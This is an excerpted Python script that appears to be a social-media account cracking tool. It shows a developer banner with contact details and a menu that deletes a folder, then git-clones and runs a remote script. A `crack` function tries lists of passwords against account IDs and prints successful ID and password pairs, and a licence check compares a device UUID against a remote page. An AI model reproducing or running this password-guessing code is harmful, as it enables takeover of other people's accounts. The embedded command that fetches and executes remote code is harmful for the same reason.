...
def banner():
	print(f"""
     ...
     \33[1;36m  ██║░░██║╚█████╔╝██║░╚═╝░██║██║██║░░██║
      \33[1;36m ╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝       
\33[1;37m--------------------------------------------
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m DEVELOPER :   Ajmir Hossain 
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m TOOLS     :   FILE & RANDOM
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m GITHUB    :   Ajmirhossain
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m VERSION   :   1.1.2
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m WHATSAPP  :   +8801813225678
\33[1;37m--------------------------------------------""")
...
def menu():
	...
	if me in ["1", "01"]:
		...
		os.system('rm -rf Control-Room && git clone https://github.com/Ajmirhossain/Control-Room && cd Control-Room && python ran.py ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [AJMIR-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\r\x1b[38;5;46m[AJMIR-OK] '+idf+ ' | '+pw+'')
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Ajmirhossain approved.html').text
    if id in httpCaht:
